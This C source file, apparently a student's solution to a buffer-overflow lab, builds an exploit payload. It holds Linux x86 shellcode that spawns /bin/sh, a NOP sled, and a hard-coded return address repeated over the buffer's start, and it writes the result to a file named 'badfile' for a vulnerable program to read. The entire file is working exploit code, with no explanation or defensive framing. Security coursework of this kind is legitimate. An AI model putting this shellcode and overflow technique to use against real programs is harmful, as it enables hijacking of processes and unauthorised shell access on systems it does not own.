/* exploit.c */
/* A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char shellcode[]=
  "\x31\xc0" /* xorl %eax,%eax */
  "\x50" /* pushl %eax */
  "\x68""//sh" /* pushl $0x68732f2f */
  "\x68""/bin" /* pushl $0x6e69622f */
  "\x89\xe3" /* movl %esp,%ebx */
  "\x50" /* pushl %eax */
  "\x53" /* pushl %ebx */
  "\x89\xe1" /* movl %esp,%ecx */
  "\x99" /* cdql */
  "\xb0\x0b" /* movb $0x0b,%al */
  "\xcd\x80" /* int $0x80 */
;

int main(int argc, char **argv) {
  char buffer[517];
  FILE *badfile;

  /* Initialize buffer with 0x90 (NOP instruction) */
  memset(&buffer, 0x90, 517);

  /* You need to fill the buffer with appropriate contents here */
  // 0xbffff2cc - buffer address
  // 0xbffff2dc - eip address
  // 0xBFFFF3F8 - potential starting spot for shell code

  buffer[0] = 0xF8;
  buffer[1] = 0xF3;
  buffer[2] = 0xFF;
  buffer[3] = 0xBF;
  buffer[4] = 0xF8;
  buffer[5] = 0xF3;
  buffer[6] = 0xFF;
  buffer[7] = 0xBF;
  buffer[8] = 0xF8;
  buffer[9] = 0xF3;
  buffer[10] = 0xFF;
  buffer[11] = 0xBF;
  buffer[12] = 0xF8;
  buffer[13] = 0xF3;
  buffer[14] = 0xFF;
  buffer[15] = 0xBF;
  buffer[16] = 0xF8;
  buffer[17] = 0xF3;
  buffer[18] = 0xFF;
  buffer[19] = 0xBF;
  buffer[20] = 0xF8;
  buffer[21] = 0xF3;
  buffer[22] = 0xFF;
  buffer[23] = 0xBF;
  buffer[24] = 0xF8;
  buffer[25] = 0xF3;
  buffer[26] = 0xFF;
  buffer[27] = 0xBF;
  buffer[28] = 0xF8;
  buffer[29] = 0xF3;
  buffer[30] = 0xFF;
  buffer[31] = 0xBF;

  memcpy(&buffer[400], shellcode, sizeof(shellcode));

  /* Save the contents to the file "badfile" */
  badfile = fopen("./badfile", "w");
  fwrite(buffer, 517, 1, badfile);
  fclose(badfile);

  return 1;
}
